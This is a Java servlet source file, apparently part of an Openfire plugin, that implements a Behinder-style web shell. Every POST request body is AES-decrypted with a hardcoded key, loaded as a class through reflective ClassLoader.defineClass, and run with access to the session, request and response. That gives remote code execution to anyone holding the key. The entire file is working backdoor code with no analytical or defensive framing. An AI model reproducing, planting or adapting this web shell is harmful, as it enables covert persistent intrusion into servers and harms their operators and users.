package org.javaweb.openfire.plugin.servlet;

import java.lang.reflect.Method;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class Behinder extends HttpServlet{

	private static final long serialVersionUID = 1L;


	@Override
	public void init() throws ServletException {
		super.init();
	}

	@Override
	protected void doGet(HttpServletRequest request, HttpServletResponse response) {
		doPost(request, response);
	}

	@Override
	protected void doPost(HttpServletRequest req, HttpServletResponse rsp)  {
		rsp.setHeader("X-Geo-Country","*");
		try {
			if (req.getMethod().equals("POST")) {
				String k = "f5d7aa3ba4929cc1";
				req.getSession().setAttribute("u", k);
				javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
				c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));
				java.util.Map<String, Object> pageContext = new java.util.HashMap<String, Object>();
				pageContext.put("session", req.getSession());
				pageContext.put("request", req);
				pageContext.put("response", rsp);
				java.io.BufferedReader bf = req.getReader();
				byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(bf.readLine()));
				String sb = new String(evilClassBytes);
				Method defineclass= ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE,Integer.TYPE);
				defineclass.setAccessible(true);
				Class clazz = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),evilClassBytes,0,evilClassBytes.length);
				Object a = clazz.newInstance();
				a.equals(pageContext);
				return;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	public void destroy() {
		super.destroy();
	}
}
